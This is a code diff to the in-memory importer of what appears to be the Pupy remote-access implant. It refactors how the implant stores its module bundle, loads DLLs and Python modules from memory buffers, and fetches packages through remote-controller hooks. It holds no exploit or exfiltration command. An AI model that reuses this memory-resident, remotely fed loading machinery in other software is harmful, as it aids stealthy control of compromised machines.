@@ -33,7 +33,7 @@ __all__ = (
     'EXTS_SOURCES', 'EXTS_COMPILED', 'EXTS_NATIVE', 'EXTS_ALL',
     'Blackhole', 'DummyPackageLoader', 'PupyPackageLoader',
 
-    'config', 'modules', 'dlls', 'client', 'revision',
+    'config', 'dlls', 'client', 'revision',
 
     'namespace', 'set_broadcast_event', 'broadcast_event',
     'obtain',
@@ -52,7 +52,10 @@ __all__ = (
     'set_debug', 'get_debug', 'dprint', 'remote_error', 'get_logger',
     'get_pending_log',
 
+    'update_module_dict',
+
     'main'
+
 )
 import sys
 import marshal
@@ -154,7 +157,8 @@ except ImportError:
 
 EXTS_SOURCES = ('.py',)
 EXTS_COMPILED = ('.pye', '.pyo', '.pyc')
-EXTS_NATIVE = ('.pyd', '.so', '.dll')
+ABI = str(sys.version_info[0])
+EXTS_NATIVE = ('.pyd', '.so', '.dll', '.abi'+ABI+'.so', '.abi'+ABI+'.pyd')
 EXTS_ALL = EXTS_NATIVE + EXTS_COMPILED + EXTS_SOURCES
 ANY_INIT = tuple(
     '__init__' + ext for ext in EXTS_SOURCES + EXTS_COMPILED
@@ -168,12 +172,10 @@ __debug_pending = []
 __trace = False
 __dprint_method = None
 
-modules = {}
+pupy_modules = None
 dlls = {}
 
-pupy = None
-remote_load_package = None
-remote_print_error = None
+pupy_hooks = None
 import_module = None
 LOGGER = None
 
@@ -195,6 +197,11 @@ direct_load = {
     # 'pythoncom': 'pythoncom27.dll'
 }
 
+
+
+
+def update_module_dict(mod):
+    pupy_modules.update(mod)
 
 def get_pending_log():
     log = __debug_pending[:]
@@ -245,14 +252,16 @@ def set_stdio(null=False):
 
 def set_debug(is_enabled):
     global __debug
-
+    
     if is_enabled:
         sys.tracebacklimit = 20
         __debug = True
+        setattr(sys, "__debug", True)
 
     else:
         sys.tracebacklimit = 0
         __debug = False
+        setattr(sys, "__debug", False)
 
 
 def get_debug():
@@ -260,7 +269,7 @@ def get_debug():
 
 
 def dprint(msg, *args, **kwargs):
-    if not (__dprint_method or __debug):
+    if not (__dprint_method or __debug or getattr(sys, "__debug", False)):
         return
 
     if args or kwargs:
@@ -298,8 +307,8 @@ def remote_error(message, *args, **kwargs):
         message += '\n' + exception_info
     except ImportError:
         pass
-
-    if not remote_print_error:
+    
+    if not pupy_hooks.remote_print_error:
         dprint(message, *args, **kwargs)
         return
 
@@ -309,7 +318,7 @@ def remote_error(message, *args, **kwargs):
         message = message.format(*args, **kwargs)
 
     try:
-        remote_print_error(message)
+        pupy_hooks.remote_print_error(message)
     except Exception as e:
         dprint('Error: {}, message={}', e, message)
         return
@@ -362,8 +371,8 @@ def load_dll(name, buf=None):
     cleanup_name = False
 
     if buf is None:
-        if name in modules:
-            buf = modules[name]
+        if name in pupy_modules.modules:
+            buf = pupy_modules.modules[name]
             cleanup_name = True
         else:
             return None
@@ -373,7 +382,7 @@ def load_dll(name, buf=None):
         dlls[name] = handle
 
         if cleanup_name:
-            del modules[name]
+            del pupy_modules.modules[name]
 
         return handle
 
@@ -404,13 +413,14 @@ def _get_module_files(fullname, path=None):
     dprint("Search in modules: " + path)
 
     files = [
-        module for module in modules
+        module for module in pupy_modules.modules
         if module.rsplit('.', 1)[0] == path or any([
             (
                 path + '/__init__' + ext == module
             ) for ext in EXTS_ALL
         ])
     ]
+    dprint("Potential files found in memory: %s"%files)
 
     return files
 
@@ -562,11 +572,10 @@ class PupyPackageLoader(object):
 
                 dprint('Load {} from native file {}'.format(
                     fullname, self.path))
-
-                self._make_module(
-                    fullname,
-                    import_module(self.contents, initname, fullname, self.path)
-                )
+                mod = import_module(self.contents, initname, fullname, self.path)
+                dprint('mod to load : {}'.format(mod))
+                sys.modules[fullname] = mod
+                #self._make_module(fullname, mod)
 
             else:
                 raise ImportError('Unsupported extension {}'.format(
@@ -635,15 +644,16 @@ class PupyPackageFinder(_bootstrap_external._LoaderBasics):
 
         for i in xrange(len(parts)):
             part = '.'.join(parts[:i+1])
-            if part in modules or part in sys.modules:
+            if part in pupy_modules.modules or part in sys.modules:
                 return True
 
         return False
 
     def _remote_load_packages(self, fullname, second_pass):
+        remote_load_package=pupy_hooks.remote_load_package
+        dprint("remote_load_package : %s"% remote_load_package)
         if not remote_load_package or second_pass:
             return
-
         if self._is_already_loaded(fullname):
             return None
 
@@ -688,7 +698,7 @@ class PupyPackageFinder(_bootstrap_external._LoaderBasics):
         spath = self.path+'/'
         lpath = len(spath)
 
-        for module in list(modules):
+        for module in list(pupy_modules.modules):
             if not module.startswith(spath):
                 continue
 
@@ -726,7 +736,7 @@ class PupyPackageFinder(_bootstrap_external._LoaderBasics):
                 files = get_module_files(fullname)
 
             if not is_supported(_import_module):
-                dprint('[L] find_module: filter out native libs')
+                dprint('[L] _import_module is not supported ... find_module: filter out native libs')
                 files = [
                     f for f in files if not f.lower().endswith(EXTS_NATIVE)
                 ]
@@ -766,7 +776,7 @@ class PupyPackageFinder(_bootstrap_external._LoaderBasics):
 
             del files[:]
 
-            content = modules[selected]
+            content = pupy_modules.modules[selected]
             dprint(
                 '{} found in "{}" / size = {}',
                 fullname, selected, len(content)
@@ -795,10 +805,10 @@ class PupyPackageFinder(_bootstrap_external._LoaderBasics):
             raise
 
         finally:
-            if selected and selected in modules:
+            if selected and selected in pupy_modules.modules:
                 dprint('[L] {} remove {} from bundle / count = {}'.format(
-                    fullname, selected, len(modules)))
-                del modules[selected]
+                    fullname, selected, len(pupy_modules.modules)))
+                del pupy_modules.modules[selected]
 
             #if not second_pass:
             #    imp.release_lock()
@@ -813,10 +823,10 @@ class PupyPackageFinder(_bootstrap_external._LoaderBasics):
 def initialize_basic_windows_modules():
     dprint('Initialize basic windows modules')
     try:
-        if 'pywintypes27.dll' in modules:
+        if 'pywintypes27.dll' in pupy_modules.modules:
             dprint('Load pywintypes')
-            load_dll('pywintypes27.dll', modules['pywintypes27.dll'])
-            del modules['pywintypes27.dll']
+            load_dll('pywintypes27.dll', pupy_modules.modules['pywintypes27.dll'])
+            del pupy_modules.modules['pywintypes27.dll']
 
             dprint('Load pywin32 loader')
             import _win32sysloader  # noqa
@@ -833,7 +843,6 @@ def initialize_basic_windows_modules():
 
 
 def load_pupyimporter(stdlib=None):
-    global modules
 
     try:
         gc.set_threshold(128)
@@ -841,7 +850,7 @@ def load_pupyimporter(stdlib=None):
         pass
 
     if stdlib:
-        modules = stdlib
+        pupy_modules.modules = stdlib
 
     if is_native():
         dprint('Install pupyimporter (standalone)')
@@ -872,9 +881,7 @@ def load_pupyimporter(stdlib=None):
 
 
 def init_pupy(argv, stdlib, debug=False):
-    global pupy
     global LOGGER
-    global modules
     global __dprint_method
     global __debug_file
 
@@ -893,6 +900,8 @@ def init_pupy(argv, stdlib, debug=False):
     if hasattr(sys.platform, 'addtarget'):
         sys.platform.addtarget(None)
 
+    setup_hooks()
+    setup_modules()
     load_pupyimporter(stdlib)
 
     LOGGER = get_logger('pupy')
@@ -933,7 +942,9 @@ def load_memimporter_fallback():
             _import_module = import_module
             _load_dll = load_dll
         except ImportError:
+            import traceback
             dprint('memimporter is not available')
+            dprint(traceback.format_exc(), error=True)
 
 
 def setup_credentials(config):
@@ -971,6 +982,19 @@ def setup_obtain():
 
     from .utils import safe_obtain
     obtain = safe_obtain
+
+def setup_hooks():
+    global pupy_hooks
+    dprint("setting up hooks")
+    pupy_hooks = make_module('pupy_hooks')
+    setattr(pupy_hooks, "remote_load_package", None)
+    setattr(pupy_hooks, "remote_print_error", None)
+
+def setup_modules():
+    global pupy_modules
+    dprint("setting up modules")
+    pupy_modules = make_module('pupy_modules')
+    setattr(pupy_modules, "modules", {})
 
 
 def prepare(argv=sys.argv, debug=False, config={}, stdlib=None):
